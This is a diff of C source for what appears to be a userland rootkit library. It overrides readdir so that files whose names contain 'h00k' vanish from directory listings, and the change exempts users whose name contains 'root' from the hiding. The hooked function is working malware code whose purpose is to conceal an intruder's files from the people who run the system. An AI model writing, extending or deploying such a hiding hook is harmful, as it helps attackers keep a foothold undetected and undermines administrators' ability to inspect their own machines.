@@ -11,25 +11,21 @@
 #include <errno.h>
 #include <dirent.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pwd.h>
 
 #define keyword "h00k"
-
-extern char **environ;
+#define permission "root"
 
 int ismaster(){
     //TODO find a good way to verify that master is master
-    int i = 0;
-    char homepath[256];
-
-    while(environ[i]){
-	if(strstr(environ[i],"HOME=")){
-	    strcpy(homepath,strstr(environ[i],"HOME="));
-	    //idk if this works :(
-	    if(strstr(homepath, keyword)){
-		return 0;
-	    }
-	}
+   struct passwd *user = getpwuid(getuid());
+   
+   if(strstr(user->pw_name,permission)){
+	return 0;
     }
+
     return 1;
 
 }
@@ -55,7 +51,7 @@ DIR *opendir(const char *name){
 }
 
 struct dirent *readdir(DIR *dirp){
-   
+  
     struct dirent *dir;
 
     if(!old_readdir){
@@ -64,8 +60,14 @@ struct dirent *readdir(DIR *dirp){
     
     dir = old_readdir(dirp);
     
+    //is user allowed to see these juicy files?
+    if(ismaster() == 0){
+	return dir;
+    }
+    
+
     //hides via keyword. Needs more testing
-    if(strstr(dir->d_name,"h00k")) return 0;
+    if(strstr(dir->d_name,keyword)) return 0;
 
     //printf("hit\n");
     return dir;
